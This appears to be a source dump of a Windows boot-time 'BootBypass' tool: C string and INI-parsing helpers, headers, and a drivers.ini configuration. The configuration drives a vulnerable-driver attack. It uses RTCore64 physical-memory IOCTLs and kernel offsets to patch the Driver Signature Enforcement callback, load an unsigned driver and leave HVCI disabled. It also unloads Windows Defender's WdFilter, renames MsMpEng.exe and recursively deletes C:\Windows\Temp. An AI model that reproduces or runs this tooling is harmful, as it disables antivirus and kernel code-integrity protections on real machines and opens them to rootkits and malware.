Project Path: arc_wesmar_KernelResearchKit_bw04tg09
// Result is always null-terminated if destSize > 0
SIZE_T wcscpy_safe(WCHAR* dest, SIZE_T destSize, const WCHAR* src) {
    if (!dest || destSize == 0) {
        return src ? wcslen(src) : 0;
    }
    
    if (!src) {
        dest[0] = 0;
        return 0;
    }
    
    SIZE_T srcLen = wcslen(src);
    SIZE_T copyLen = (srcLen < destSize - 1) ? srcLen : (destSize - 1);
    
    SIZE_T i;
    for (i = 0; i < copyLen; i++) {
        dest[i] = src[i];
    }
    dest[i] = 0;
    
    return srcLen; // Return full source length (may be > copyLen if truncated)
}

// Safe string concatenate with size limit
// Returns: length of dest+src combined (what would be the result if buffer was infinite)
// Result is always null-terminated if destSize > 0
SIZE_T wcscat_safe(WCHAR* dest, SIZE_T destSize, const WCHAR* src) {
    if (!dest || destSize == 0) {
        return src ? wcslen(src) : 0;
    }
    
    if (!src) {
        return wcsnlen_safe(dest, destSize);
    }
    
    // Use bounded length check in case dest is not properly terminated
    SIZE_T destLen = wcsnlen_safe(dest, destSize);
    SIZE_T srcLen = wcslen(src);
    
    // If dest already fills buffer, cannot append
    if (destLen >= destSize - 1) {
        return destLen + srcLen;
    }
    
    SIZE_T remaining = destSize - destLen - 1;
    SIZE_T copyLen = (srcLen < remaining) ? srcLen : remaining;
    
    SIZE_T i;
    for (i = 0; i < copyLen; i++) {
        dest[destLen + i] = src[i];
    }
    dest[destLen + i] = 0;
    
    return destLen + srcLen; // Return total length that would result
}

// Check if concatenation would fit without truncation
BOOLEAN wcscat_check(WCHAR* dest, SIZE_T destSize, const WCHAR* src) {
    if (!dest || !src || destSize == 0) return FALSE;
    
    SIZE_T destLen = wcsnlen_safe(dest, destSize);
    SIZE_T srcLen = wcslen(src);
    
    // Check overflow protection: destLen + srcLen + 1 <= destSize
    if (destLen >= destSize) return FALSE;
    if (srcLen > (destSize - destLen - 1)) return FALSE;
    
    return TRUE;
}

// Validate if adding addLen to currentLen would exceed maxLen
// Protected against arithmetic overflow
BOOLEAN validate_string_space(SIZE_T currentLen, SIZE_T addLen, SIZE_T maxLen) {
    if (currentLen >= maxLen) return FALSE;
    if (addLen > (maxLen - currentLen - 1)) return FALSE;
    return TRUE;
}

void TrimString(PWSTR str) {
    PWSTR start = str, end;
    while (*start == L' ' || *start == L'\t' || *start == L'\r' || *start == L'\n') start++;
    if (*start == 0) { *str = 0; return; }
    
    PWSTR semicolon = start;
    while (*semicolon && *semicolon != L';') semicolon++;
    if (*semicolon == L';') *semicolon = 0;
    
    end = start + wcslen(start) - 1;
    while (end > start && (*end == L' ' || *end == L'\t' || *end == L'\r' || *end == L'\n')) end--;
    *(end + 1) = 0;
    if (start != str) wcscpy(str, start);
}

BOOLEAN StringToULONGLONG(PCWSTR str, ULONGLONG* out) {
    ULONGLONG result = 0;
    PCWSTR p = str;
    if (p[0] == L'0' && (p[1] == L'x' || p[1] == L'X')) {
        p += 2;
        while (*p) {
            WCHAR c = *p;
            ULONGLONG digit;
            if (c >= L'0' && c <= L'9') digit = c - L'0';
            else if (c >= L'a' && c <= L'f') digit = c - L'a' + 10;
            else if (c >= L'A' && c <= L'F') digit = c - L'A' + 10;
            else return FALSE;
            result = (result << 4) | digit;
            p++;
        }
    } else {
        while (*p) {
            if (*p < L'0' || *p > L'9') return FALSE;
            result = result * 10 + (*p - L'0');
            p++;
        }
    }
    *out = result;
    return TRUE;
}

BOOLEAN StringToULONG(PCWSTR str, PULONG out) {
    ULONGLONG result;
    if (!StringToULONGLONG(str, &result) || result > 0xFFFFFFFF) return FALSE;
    *out = (ULONG)result;
    return TRUE;
}

void ULONGLONGToHexString(ULONGLONG value, PWSTR buffer, BOOLEAN includePrefix) {
    const WCHAR hexChars[] = L"0123456789ABCDEF";
    int i, offset = 0;
    if (includePrefix) { buffer[0] = L'0'; buffer[1] = L'x'; offset = 2; }
    for (i = 0; i < 16; i++) {
        int nibble = (value >> (60 - i * 4)) & 0xF;
        buffer[offset + i] = hexChars[nibble];
    }
    buffer[offset + 16] = 0;
}

void DisplayMessage(PCWSTR message) {
    if (!message) return;
    WCHAR tempBuffer[512];
    SIZE_T len = wcslen(message);
    if (len >= 512) len = 511;
    wcscpy(tempBuffer, message);
    tempBuffer[len] = L'\0';
    UNICODE_STRING usMsg;
    RtlInitUnicodeString(&usMsg, tempBuffer);
    NtDisplayString(&usMsg);
}

void DisplayStatus(NTSTATUS status) {
    WCHAR statusMsg[20];
    WCHAR hexChars[] = L"0123456789ABCDEF";
    statusMsg[0] = L' '; statusMsg[1] = L'('; statusMsg[2] = L'0'; statusMsg[3] = L'x';
    for (int i = 0; i < 8; i++) {
        int nibble = (status >> (28 - i * 4)) & 0xF;
        statusMsg[4 + i] = hexChars[nibble];
    }
    statusMsg[12] = L')'; statusMsg[13] = L'\r'; statusMsg[14] = L'\n'; statusMsg[15] = 0;
    DisplayMessage(statusMsg);
}

BOOLEAN ReadIniFile(PCWSTR filePath, PWSTR* outBuffer) {
    UNICODE_STRING usFilePath;
    OBJECT_ATTRIBUTES oa;
    IO_STATUS_BLOCK iosb;
    HANDLE hFile;
    NTSTATUS status;
    static WCHAR staticBuffer[8192];
    LARGE_INTEGER byteOffset;

    RtlInitUnicodeString(&usFilePath, filePath);
    InitializeObjectAttributes(&oa, &usFilePath, OBJ_CASE_INSENSITIVE, NULL, NULL);

    status = NtOpenFile(&hFile, FILE_READ_DATA | SYNCHRONIZE, &oa, &iosb, FILE_SHARE_READ | FILE_SHARE_WRITE, 0);
    if (!NT_SUCCESS(status)) return FALSE;

    memset_impl(staticBuffer, 0, sizeof(staticBuffer));
    byteOffset.QuadPart = 0;
    status = NtReadFile(hFile, NULL, NULL, NULL, &iosb, staticBuffer, sizeof(staticBuffer) - sizeof(WCHAR), &byteOffset, NULL);
    NtClose(hFile);
    if (!NT_SUCCESS(status) && status != 0x103) return FALSE;
    *outBuffer = staticBuffer;
    return TRUE;
}

ULONG ParseIniFile(PWSTR iniContent, PINI_ENTRY entries, ULONG maxEntries, PCONFIG_SETTINGS config) {
    ULONG entryCount = 0;
    PWSTR line = iniContent, nextLine;
    WCHAR lineBuf[MAX_PATH_LEN];
    ULONG i;
    int currentEntry = -1;
    BOOLEAN inConfigSection = FALSE;

    // Defaults
    config->Execute = TRUE;
    config->RestoreHVCI = TRUE;
    config->DriverDevice[0] = 0;
    config->IoControlCode_Read = 0;
    config->IoControlCode_Write = 0;
    
    if (!iniContent || iniContent[0] == 0) return 0;
    if (iniContent[0] == 0xFEFF) line++;

    while (*line && entryCount < maxEntries) {
        nextLine = line;
        while (*nextLine && *nextLine != L'\r' && *nextLine != L'\n') nextLine++;
        
        i = 0;
        while (line < nextLine && i < (MAX_PATH_LEN - 1)) lineBuf[i++] = *line++;
        lineBuf[i] = 0;
        line = nextLine;
        if (*line == L'\r') line++;
        if (*line == L'\n') line++;
        
        TrimString(lineBuf);
        if (lineBuf[0] == 0 || lineBuf[0] == L';' || lineBuf[0] == L'#') continue;

        if (lineBuf[0] == L'[') {
            if (_wcsicmp_impl(lineBuf, L"[Config]") == 0) {
                inConfigSection = TRUE;
                currentEntry = -1;
                continue;
            }
            if (_wcsicmp_impl(lineBuf, L"[DSE_STATE]") == 0) {
                inConfigSection = FALSE;
                currentEntry = -1;
                continue;
            }
            inConfigSection = FALSE;
            if (currentEntry >= 0) {
                if (entries[currentEntry].DisplayName[0] == 0 && entries[currentEntry].ServiceName[0]) {
                    wcscpy_safe(entries[currentEntry].DisplayName, MAX_PATH_LEN, entries[currentEntry].ServiceName);
                }
                entryCount++;
            }
            if (entryCount < maxEntries) {
                currentEntry = (LONG)entryCount;
                memset_impl(&entries[currentEntry], 0, sizeof(INI_ENTRY));
                wcscpy_safe(entries[currentEntry].DriverType, 16, L"KERNEL");
                wcscpy_safe(entries[currentEntry].StartType, 16, L"DEMAND");
            } else currentEntry = -1;
            continue;
        }

        if (inConfigSection && lineBuf[0] != 0) {
            PWSTR equals = lineBuf;
            while (*equals && *equals != L'=') equals++;
            if (*equals == L'=') {
                *equals = 0;
                PWSTR key = lineBuf, value = equals + 1;
                TrimString(key); TrimString(value);
                if (_wcsicmp_impl(key, L"Execute") == 0) config->Execute = (_wcsicmp_impl(value, L"YES") == 0 || _wcsicmp_impl(value, L"1") == 0);
                else if (_wcsicmp_impl(key, L"RestoreHVCI") == 0) config->RestoreHVCI = (_wcsicmp_impl(value, L"YES") == 0 || _wcsicmp_impl(value, L"1") == 0);
                else if (_wcsicmp_impl(key, L"DriverDevice") == 0) wcscpy_safe(config->DriverDevice, MAX_PATH_LEN, value);
                else if (_wcsicmp_impl(key, L"IoControlCode_Read") == 0) StringToULONG(value, &config->IoControlCode_Read);
                else if (_wcsicmp_impl(key, L"IoControlCode_Write") == 0) StringToULONG(value, &config->IoControlCode_Write);
                else if (_wcsicmp_impl(key, L"Offset_SeCiCallbacks") == 0) StringToULONGLONG(value, &config->Offset_SeCiCallbacks);
                else if (_wcsicmp_impl(key, L"Offset_Callback") == 0) StringToULONGLONG(value, &config->Offset_Callback);
                else if (_wcsicmp_impl(key, L"Offset_SafeFunction") == 0) StringToULONGLONG(value, &config->Offset_SafeFunction);
            }
            continue;
        }

        if (currentEntry >= 0 && (ULONG)currentEntry < maxEntries) {
            PWSTR equals = lineBuf;
            while (*equals && *equals != L'=') equals++;
            if (*equals == L'=') {
                *equals = 0;
                PWSTR key = lineBuf, value = equals + 1;
                TrimString(key); TrimString(value);
                if (_wcsicmp_impl(key, L"Action") == 0) {
                    if (_wcsicmp_impl(value, L"LOAD") == 0) entries[currentEntry].Action = ACTION_LOAD;
                    else if (_wcsicmp_impl(value, L"UNLOAD") == 0) entries[currentEntry].Action = ACTION_UNLOAD;
                    else if (_wcsicmp_impl(value, L"RENAME") == 0) entries[currentEntry].Action = ACTION_RENAME;
                    else if (_wcsicmp_impl(value, L"DELETE") == 0) entries[currentEntry].Action = ACTION_DELETE;
                }
                else if (_wcsicmp_impl(key, L"ServiceName") == 0) wcscpy_safe(entries[currentEntry].ServiceName, MAX_PATH_LEN, value);
                else if (_wcsicmp_impl(key, L"DisplayName") == 0) wcscpy_safe(entries[currentEntry].DisplayName, MAX_PATH_LEN, value);
                else if (_wcsicmp_impl(key, L"ImagePath") == 0) wcscpy_safe(entries[currentEntry].ImagePath, MAX_PATH_LEN, value);
                else if (_wcsicmp_impl(key, L"Type") == 0) wcscpy_safe(entries[currentEntry].DriverType, 16, value);
                else if (_wcsicmp_impl(key, L"StartType") == 0) wcscpy_safe(entries[currentEntry].StartType, 16, value);
                else if (_wcsicmp_impl(key, L"CheckIfLoaded") == 0) entries[currentEntry].CheckIfLoaded = (_wcsicmp_impl(value, L"YES") == 0);
                else if (_wcsicmp_impl(key, L"AutoPatch") == 0) entries[currentEntry].AutoPatch = (_wcsicmp_impl(value, L"YES") == 0 || _wcsicmp_impl(value, L"1") == 0);
                else if (_wcsicmp_impl(key, L"SourcePath") == 0) wcscpy_safe(entries[currentEntry].SourcePath, MAX_PATH_LEN, value);
                else if (_wcsicmp_impl(key, L"TargetPath") == 0) wcscpy_safe(entries[currentEntry].TargetPath, MAX_PATH_LEN, value);
                else if (_wcsicmp_impl(key, L"ReplaceIfExists") == 0) entries[currentEntry].ReplaceIfExists = (_wcsicmp_impl(value, L"YES") == 0);
                else if (_wcsicmp_impl(key, L"DeletePath") == 0) wcscpy_safe(entries[currentEntry].DeletePath, MAX_PATH_LEN, value);
                else if (_wcsicmp_impl(key, L"RecursiveDelete") == 0) entries[currentEntry].RecursiveDelete = (_wcsicmp_impl(value, L"YES") == 0);
            }
        }
    }
    if (currentEntry >= 0) {
        if (entries[currentEntry].DisplayName[0] == 0 && entries[currentEntry].ServiceName[0]) {
            wcscpy_safe(entries[currentEntry].DisplayName, MAX_PATH_LEN, entries[currentEntry].ServiceName);
        }
        entryCount++;
    }
    return entryCount;
}
```

`BootBypass(FastReboot)/SystemUtils.h`:

```h
#ifndef SYSTEM_UTILS_H
#define SYSTEM_UTILS_H

#include "BootBypass.h"

#if DEBUG_LOGGING_ENABLED
    #define DEBUG_LOG(msg) DisplayMessage(msg)
    #define DEBUG_STATUS(status) DisplayStatus(status)
#else
    #define DEBUG_LOG(msg)
    #define DEBUG_STATUS(status)
#endif

void* memset_impl(void* dest, int c, SIZE_T count);
SIZE_T wcslen(const WCHAR* str);
WCHAR* wcscpy(WCHAR* dest, const WCHAR* src);
WCHAR* wcscat(WCHAR* dest, const WCHAR* src);
int _wcsicmp_impl(const WCHAR* str1, const WCHAR* str2);
// Safe string operations with bounds checking
// All size parameters are in WCHAR count (not bytes)
// Returns: actual length of result string (not including null terminator)
// If truncation occurs, returns what WOULD be the full length (like strlcpy/strlcat)
SIZE_T wcscpy_safe(WCHAR* dest, SIZE_T destSize, const WCHAR* src);
SIZE_T wcscat_safe(WCHAR* dest, SIZE_T destSize, const WCHAR* src);
// Check if concatenation would fit without truncation
BOOLEAN wcscat_check(WCHAR* dest, SIZE_T destSize, const WCHAR* src);

// Bounded string length - never reads beyond maxLen characters
SIZE_T wcsnlen_safe(const WCHAR* str, SIZE_T maxLen);

// Validate if adding addLen to currentLen would exceed maxLen (with overflow protection)
BOOLEAN validate_string_space(SIZE_T currentLen, SIZE_T addLen, SIZE_T maxLen);
void TrimString(PWSTR str);
BOOLEAN StringToULONGLONG(PCWSTR str, ULONGLONG* out);
BOOLEAN StringToULONG(PCWSTR str, PULONG out);
void ULONGLONGToHexString(ULONGLONG value, PWSTR buffer, BOOLEAN includePrefix);
void DisplayMessage(PCWSTR message);
void DisplayStatus(NTSTATUS status);
BOOLEAN ReadIniFile(PCWSTR filePath, PWSTR* outBuffer);
ULONG ParseIniFile(PWSTR iniContent, PINI_ENTRY entries, ULONG maxEntries, PCONFIG_SETTINGS config);

#endif
```

`BootBypass(FastReboot)/drivers.ini`:

```ini
; ============================================================================
; BootBypass Configuration File
; ============================================================================
; Operations are executed sequentially in the order they appear below.
; This file uses UTF-16 LE encoding with BOM.

; ============================================================================
; GLOBAL CONFIGURATION
; ============================================================================
[Config]
; Master switch: YES=execute all operations, NO=exit immediately (safe disable)
Execute=YES

; Controls Memory Integrity re-enablement after operations
;   YES = Set HVCI registry flag back to enabled (cosmetic, requires normal boot to activate)
;   NO  = Leave HVCI permanently disabled in registry
RestoreHVCI=NO

; Non-compliant Driver Configuration (required for DSE patching)
; Device path for vulnerable driver communication
DriverDevice=\Device\RTCore64

; RTCore64-specific IOCTL codes (hardcoded in driver, DO NOT CHANGE unless using different vulnerable driver)
IoControlCode_Read=0x80002048     ; CTL_CODE for physical memory read
IoControlCode_Write=0x8000204C    ; CTL_CODE for physical memory write

; Windows 11 25H2 kernel offsets (build-specific, update after Windows updates!)
; These offsets are CONSTANT for a specific ntoskrnl.exe version (same build = same offsets)
; Use drvloader.exe option 2 to auto-detect and save current offsets (no driver needed)
; Alternatively: WinDbg/IDA for manual symbol resolution

Offset_SeCiCallbacks=0xF04700     ; g_CiCallbacks structure base (static offset in ntoskrnl)
Offset_Callback=0x20              ; Offset to CiValidateImageHeader pointer within structure
Offset_SafeFunction=0x69F560      ; ZwFlushInstructionCache - always-success dummy function

; ============================================================================
; OPERATION DEFINITIONS
; ============================================================================
; Supported Actions: LOAD, UNLOAD, RENAME, DELETE
; All paths use NT native format: \??\C:\... or \SystemRoot\...

; ----------------------------------------------------------------------------
; DRIVER LOADING with AutoPatch (DSE Bypass)
; ----------------------------------------------------------------------------
[Driver1]
Action=LOAD                       ; Load a kernel driver
AutoPatch=YES                     ; Full cycle: Load non-compliant driver → Patch DSE → Load target → Restore DSE → Unload non-compliant driver
ServiceName=omnidriver            ; Service registry key name
DisplayName=omnidriver            ; Display name in services
ImagePath=\SystemRoot\System32\drivers\omnidriver.sys
Type=KERNEL                       ; KERNEL or FILE_SYSTEM
StartType=DEMAND                  ; BOOT(0), SYSTEM(1), AUTO(2), DEMAND(3), DISABLED(4)
CheckIfLoaded=YES                 ; Skip if already loaded (prevents errors)

; ----------------------------------------------------------------------------
; DRIVER UNLOADING
; ----------------------------------------------------------------------------
[Driver2]
Action=UNLOAD                     ; Unload a running kernel driver
ServiceName=KslD                  ; Service name to unload
DisplayName=KslD

[Driver3]
Action=UNLOAD
ServiceName=WdFilter              ; Windows Defender filter driver
DisplayName=WdFilter

; ----------------------------------------------------------------------------
; FILE/DIRECTORY RENAMING
; ----------------------------------------------------------------------------
[Rename1]
Action=RENAME                     ; Rename file or directory
ServiceName=RenameOperation       ; Operation identifier (can be anything)
DisplayName=Rename Windows Defender Executable
SourcePath=\??\C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25090.3009-0\MsMpEng.exe
TargetPath=\??\C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25090.3009-0\MsMpEng_.exe
ReplaceIfExists=NO                ; YES = Overwrite if target exists, NO = Fail if exists

; ----------------------------------------------------------------------------
; FILE/DIRECTORY DELETION
; ----------------------------------------------------------------------------
[Delete1]
Action=DELETE                     ; Delete file or directory
DisplayName=Delete Temp Directory
DeletePath=\??\C:\Windows\Temp
RecursiveDelete=YES               ; YES = Force delete directory tree, NO = Fail if not empty

; ============================================================================
; ADVANCED NOTES
; ============================================================================
; 1. HVCI Detection:
;    - If HVCI=1 detected, program schedules automatic reboot via RebootGuardian service
;    - After reboot, operations execute with HVCI=0
;
; 2. AutoPatch Sequence (per driver):
;    STEP 1: Load non-compliant_drv.sys (vulnerable driver)
;    STEP 2: Patch DSE callback in ntoskrnl.exe memory
;    STEP 3: Load unsigned target driver
;    STEP 4: Restore original DSE callback
;    STEP 5: Unload non-compliant_drv.sys
;
; 3. DSE State Persistence:
;    - Original callback address saved to [DSE_STATE] section in this file
;    - Auto-restored on next run if system crashes during patch
;
; 4. Path Formats:
;    Native NT paths required:
;      - Local:  \??\C:\Path\To\File
;      - System: \SystemRoot\System32\file.sys
;      - Device: \Device\HarddiskVolume1\Path
;
; 5. Privilege Requirements:
;    - SE_LOAD_DRIVER_PRIVILEGE (load/unload drivers)
;    - SE_BACKUP_PRIVILEGE (bypass file security)
;    - SE_RESTORE_PRIVILEGE (modify protected files)
;    All automatically enabled by the program.
;
; 6. Offset Updates:
;    - After Windows update: Run drvloader.exe → Option 2 → Auto-updates this file
;    - Offsets stored in mini-PDB cache: C:\Windows\symbols\ntkrnlmp.pdb\{GUID}\ntkrnlmp.mpdb
;    - Same Windows build = same offsets (deterministic)
;
; 7. Safety Features:
;    - Set Execute=NO to disable all operations without removing entries
;    - Operations continue even if individual tasks fail
;    - HVCI restoration can be disabled (RestoreHVCI=NO)
;    - RebootGuardian service auto-removes itself after reboot
;
; ============================================================================
```

`BootBypass(FastReboot)/resource.h`:

```h
//{{NO_DEPENDENCIES}}
// Microsoft Visual C++ generated include file.
// Used by BootBypass.rc

// Next default values for new objects
// 
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS

#define IDR_DRV                         101
#define _APS_NEXT_RESOURCE_VALUE        102


#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           102
#endif
#endif

```

`BootBypass/BootBypass.h`:

```h
#ifndef BOOT_BYPASS_H
#define BOOT_BYPASS_H

#pragma comment(lib, "ntdll.lib")
#pragma comment(linker, "/SUBSYSTEM:NATIVE /ENTRY:NtProcessStartup /NODEFAULTLIB /STACK:0x100000,0x100000")
#pragma optimize("", off)
#pragma check_stack(off)

// ============================================================================
// BUILD CONFIGURATION
// ============================================================================
#define DEBUG_LOGGING_ENABLED 1

// ============================================================================
// MACROS & CONSTANTS
// ============================================================================
#define NTAPI __stdcall
#define NULL 0
#define TRUE 1
#define FALSE 0
#define STATUS_SUCCESS 0
#define STATUS_NO_SUCH_DEVICE 0xC0000000
#define STATUS_OBJECT_NAME_NOT_FOUND 0xC0000034
#define STATUS_OBJECT_NAME_COLLISION 0xC0000035
#define STATUS_IMAGE_ALREADY_LOADED 0xC000010E
#define SE_LOAD_DRIVER_PRIVILEGE 10
#define SE_BACKUP_PRIVILEGE 17
#define SE_RESTORE_PRIVILEGE 18
#define OBJ_CASE_INSENSITIVE 0x40
#define OBJ_KERNEL_HANDLE 0x200
#define FILE_SYNCHRONOUS_IO_NONALERT 0x00000020
#define FILE_OPEN_FOR_BACKUP_INTENT 0x00004000
#define FILE_SHARE_READ 0x00000001
#define FILE_SHARE_WRITE 0x00000002
#define FILE_SHARE_DELETE 0x00000004
#define FILE_OVERWRITE_IF 0x00000005
#define SYNCHRONIZE 0x00100000L
#define DELETE 0x00010000
#define FILE_READ_DATA 0x00000001
#define FILE_WRITE_DATA 0x00000002
#define FILE_OVERWRITE 0x00000004
#define FILE_CREATE 0x00000002
#define FILE_ATTRIBUTE_NORMAL 0x00000080
#define FILE_READ_ATTRIBUTES 0x00000080
#define FILE_LIST_DIRECTORY 0x00000001
#define FILE_DIRECTORY_FILE 0x00000001
#define KEY_READ 0x00020019
#define KEY_WRITE 0x00020006
#define KEY_ALL_ACCESS 0x000F003F
#define REG_OPTION_NON_VOLATILE 0x00000000
#define REG_SZ 1
#define REG_EXPAND_SZ 2
#define REG_DWORD 4
#define REG_MULTI_SZ 7
#define MAX_ENTRIES 64
#define MAX_PATH_LEN 512
#define STATE_FILE_PATH L"\\SystemRoot\\drivers.ini"
#define OmniDriver_Log L"\\SystemRoot\\system.evtx"
#define HVCI_REG_PATH L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity"

// Type definitions
typedef void VOID;
typedef unsigned char UCHAR;
typedef unsigned char BOOLEAN;
typedef unsigned short USHORT;
typedef unsigned short WCHAR;
typedef unsigned long ULONG;
typedef unsigned long DWORD;
typedef unsigned long long ULONGLONG;
typedef unsigned long long SIZE_T;
typedef long LONG;
typedef long NTSTATUS;
typedef void* HANDLE;
typedef void* PVOID;
typedef WCHAR* PWSTR;
typedef const WCHAR* PCWSTR;
typedef BOOLEAN* PBOOLEAN;
typedef HANDLE* PHANDLE;
typedef ULONG* PULONG;
typedef ULONGLONG* PULONGLONG; // <--- DODANO TO (Fix C2081/C2146)

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

// Struct definitions
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _IO_STATUS_BLOCK {
    union {
        NTSTATUS Status;
        PVOID Pointer;
    } u;
    ULONG Information;
} IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;

typedef union _LARGE_INTEGER {
    struct {
        ULONG LowPart;
        LONG HighPart;
    };
    ULONGLONG QuadPart;
} LARGE_INTEGER, *PLARGE_INTEGER;

// PE Headers
typedef struct _IMAGE_DOS_HEADER {
    USHORT e_magic;      // Magic number (MZ)
    USHORT e_cblp;       // Bytes on last page
    USHORT e_cp;         // Pages in file
    USHORT e_cres;       // Relocations
    USHORT e_cparhdr;    // Size of header in paragraphs
    USHORT e_minalloc;   // Minimum extra paragraphs needed
    USHORT e_maxalloc;   // Maximum extra paragraphs needed
    USHORT e_ss;         // Initial (relative) SS value
    USHORT e_sp;         // Initial SP value
    USHORT e_csum;       // Checksum
    USHORT e_ip;         // Initial IP value
    USHORT e_cs;         // Initial (relative) CS value
    USHORT e_lfarlc;     // File address of relocation table
    USHORT e_ovno;       // Overlay number
    USHORT e_res[4];     // Reserved words
    USHORT e_oemid;      // OEM identifier
    USHORT e_oeminfo;    // OEM information
    USHORT e_res2[10];   // Reserved words
    LONG e_lfanew;       // File address of new exe header (PE header)
} IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER;

typedef struct _IMAGE_FILE_HEADER {
    USHORT Machine;
    USHORT NumberOfSections;
    ULONG TimeDateStamp;
    ULONG PointerToSymbolTable;
    ULONG NumberOfSymbols;
    USHORT SizeOfOptionalHeader;
    USHORT Characteristics;
} IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;

typedef struct _IMAGE_DATA_DIRECTORY {
    ULONG VirtualAddress;
    ULONG Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;

typedef struct _IMAGE_OPTIONAL_HEADER64 {
    USHORT Magic;
    UCHAR MajorLinkerVersion;
    UCHAR MinorLinkerVersion;
    ULONG SizeOfCode;
    ULONG SizeOfInitializedData;
    ULONG SizeOfUninitializedData;
    ULONG AddressOfEntryPoint;
    ULONG BaseOfCode;
    ULONGLONG ImageBase;
    ULONG SectionAlignment;
    ULONG FileAlignment;
    USHORT MajorOperatingSystemVersion;
    USHORT MinorOperatingSystemVersion;
    USHORT MajorImageVersion;
    USHORT MinorImageVersion;
    USHORT MajorSubsystemVersion;
    USHORT MinorSubsystemVersion;
    ULONG Win32VersionValue;
    ULONG SizeOfImage;
    ULONG SizeOfHeaders;
    ULONG CheckSum;
    USHORT Subsystem;
    USHORT DllCharacteristics;
    ULONGLONG SizeOfStackReserve;
    ULONGLONG SizeOfStackCommit;
    ULONGLONG SizeOfHeapReserve;
    ULONGLONG SizeOfHeapCommit;
    ULONG LoaderFlags;
    ULONG NumberOfRvaAndSizes;
    IMAGE_DATA_DIRECTORY DataDirectory[16];
} IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;

typedef struct _IMAGE_NT_HEADERS64 {
    ULONG Signature;
    IMAGE_FILE_HEADER FileHeader;
    IMAGE_OPTIONAL_HEADER64 OptionalHeader;
} IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;

typedef struct _IMAGE_RESOURCE_DIRECTORY {
    ULONG Characteristics;
    ULONG TimeDateStamp;
    USHORT MajorVersion;
    USHORT MinorVersion;
    USHORT NumberOfNamedEntries;
    USHORT NumberOfIdEntries;
} IMAGE_RESOURCE_DIRECTORY, *PIMAGE_RESOURCE_DIRECTORY;

typedef struct _IMAGE_RESOURCE_DIRECTORY_ENTRY {
    union {
        struct {
            ULONG NameOffset : 31;
            ULONG NameIsString : 1;
        };
        ULONG Name;
        USHORT Id;
    };
    union {
        ULONG OffsetToData;
        struct {
            ULONG OffsetToDirectory : 31;
            ULONG DataIsDirectory : 1;
        };
    };
} IMAGE_RESOURCE_DIRECTORY_ENTRY, *PIMAGE_RESOURCE_DIRECTORY_ENTRY;

typedef struct _IMAGE_RESOURCE_DATA_ENTRY {
    ULONG OffsetToData;
    ULONG Size;
    ULONG CodePage;
    ULONG Reserved;
} IMAGE_RESOURCE_DATA_ENTRY, *PIMAGE_RESOURCE_DATA_ENTRY;

#define IMAGE_DIRECTORY_ENTRY_RESOURCE 2

// System Modules
typedef struct _SYSTEM_MODULE_ENTRY {
    PVOID Reserved1;
    PVOID Reserved2;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT Index;
    USHORT Unknown;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    char ImageName[256];
} SYSTEM_MODULE_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION;

// INI & Config Structures
typedef enum _ACTION_TYPE {
    ACTION_LOAD = 0,
    ACTION_UNLOAD = 1,
    ACTION_RENAME = 2,
